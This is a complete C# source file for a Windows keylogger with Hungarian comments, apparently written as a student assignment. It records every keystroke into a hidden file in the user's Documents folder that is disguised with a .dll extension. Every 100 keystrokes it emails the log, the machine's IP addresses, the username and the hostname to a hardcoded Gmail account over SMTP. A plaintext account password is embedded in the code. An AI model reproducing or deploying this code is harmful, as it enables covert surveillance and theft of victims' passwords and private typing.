using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;

namespace Keylogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i); //ellenőrzi hogy az adott billentyű le van e nyomva

        static long leutes = 0;


        static void Main(string[] args)
        {

            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (filepath + @"\beadando.dll");
            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }

                File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
            }
            while (true)
            {
                Thread.Sleep(1);
                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32769)
                    {
                        Console.Write((char)i + "");
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);
                        }
                        leutes++;
                        if (leutes % 100 == 0)
                        {
                            Levelezes();
                        }
                    }
                }
            }
        }//main
        static void Levelezes()
        {
            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = folderName + @"\beadando.dll";

            String logContents = File.ReadAllText(filePath);
            string emailBody = "";

            DateTime now = DateTime.Now;
            
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var address in host.AddressList)
            {
                emailBody += "Cím: " + address;
            }
            emailBody += "\nFelhasználó: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\nBejelentekzési pont: " + host;
            emailBody += "\nIdő " + now.ToString();
            emailBody += "\n";
            emailBody += logContents;

            var fromAddress = new MailAddress("bmlkeylogger@gmail.com", "Milásztól");
            var toAddress = new MailAddress("bmlkeylogger@gmail.com", "Milásznak");
            const string fromPassword = "Beadando123";
            const string subject = "Tárgy";
            string body = emailBody;

            var smtp = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
            };
            using (var message = new MailMessage(fromAddress, toAddress)
            {
                Subject = subject,
                Body = body
            })
            {
                smtp.Send(message);
            }

        }
    }
}
